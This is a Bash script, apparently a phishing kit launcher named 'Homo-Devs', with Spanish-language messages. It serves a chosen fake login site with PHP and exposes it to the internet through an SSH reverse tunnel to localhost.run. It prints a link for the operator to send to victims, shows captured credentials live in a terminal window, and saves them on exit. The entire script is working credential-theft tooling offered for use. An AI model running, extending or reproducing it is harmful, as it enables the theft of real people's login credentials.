#!/bin/bash

RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" END="$(printf '\033[0m\e[0m')"

ctrl_c(){
	echo -e "\n[${RED}!${END}] ${RED}Saliendo...${END}"
	pkill php &>/dev/null
	pkill xterm &>/dev/null
	cat sites/$x/credentials.txt >> credentials.txt
	if [[ -f 'sites/$x/credentials.txt' && -s 'sites/$x/credentials.txt' ]];then
		clear
		banner
		echo -e "[${CYAN}+${END}] ${CYAN}Credenciales capturadas:${END}"
		cat sites/$x/credentials.txt
	fi
	rm sites/$x/credentials.txt &>/dev/null
	rm link.txt
	exit 1
} 2>/dev/null

trap ctrl_c INT

banner() {
	cat <<- EOF
	
${MAGENTA}██╗  ██╗ ██████╗ ███╗   ███╗ ██████╗       ██████╗ ███████╗██╗   ██╗███████╗
${MAGENTA}██║  ██║██╔═══██╗████╗ ████║██╔═══██╗      ██╔══██╗██╔════╝██║   ██║██╔════╝
${MAGENTA}███████║██║   ██║██╔████╔██║██║   ██║█████╗██║  ██║█████╗  ██║   ██║███████╗
${MAGENTA}██╔══██║██║   ██║██║╚██╔╝██║██║   ██║╚════╝██║  ██║██╔══╝  ██║   ██║╚════██║
${MAGENTA}██║  ██║╚██████╔╝██║ ╚═╝ ██║╚██████╔╝      ██████╔╝███████╗╚██████╔╝███████║
${MAGENTA}╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝       ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ ${RED}0.1
                            ${CYAN}By: Alcatraz2033
                ${GREEN}Github: https://github.com/Alcatraz2033${END}
                
	EOF
}

function cheker(){

	which php &>/dev/null
	if [ $? -ne "0" ];then
		echo -e "\n[+]${CYAN} Instalando php...${END}"
		sudo apt install php -y &>/dev/null
	fi
	which xterm &>/dev/null
	if [ $? -ne "0" ];then
		echo -e "\n[+]${CYAN} Instalando xterm...${END}"
		sudo apt install xterm -y &>/dev/null
	fi
	clear
	banner
}

process(){
	echo -e "\n[${CYAN}+${END}] ${CYAN}Iniciando servidor${END}"
	cd sites/$1
	php -S 127.0.0.1:80 &>/dev/null &
	cd ../../
	xterm -hold -title "Servidor" -e "ssh -R 80:localhost:80 localhost.run > link.txt" &
	while true;do
		if [[ -f 'link.txt' && -s 'link.txt' ]];then
			link=$(cat link.txt | awk '{print $NF}')
			echo -e "[${CYAN}+${END}] ${CYAN}Envie este link: ${END} $link"
			break
		fi
	done
	xterm -hold -title "Credenciales" -e "watch -n1 cat sites/$1/credentials.txt" &
	while true;do
		sleep 1
	done
}

selection(){
	PS3=">>> "
	select x in $(ls sites/);do
		process $x
	done	
}

clear
banner
cheker
selection
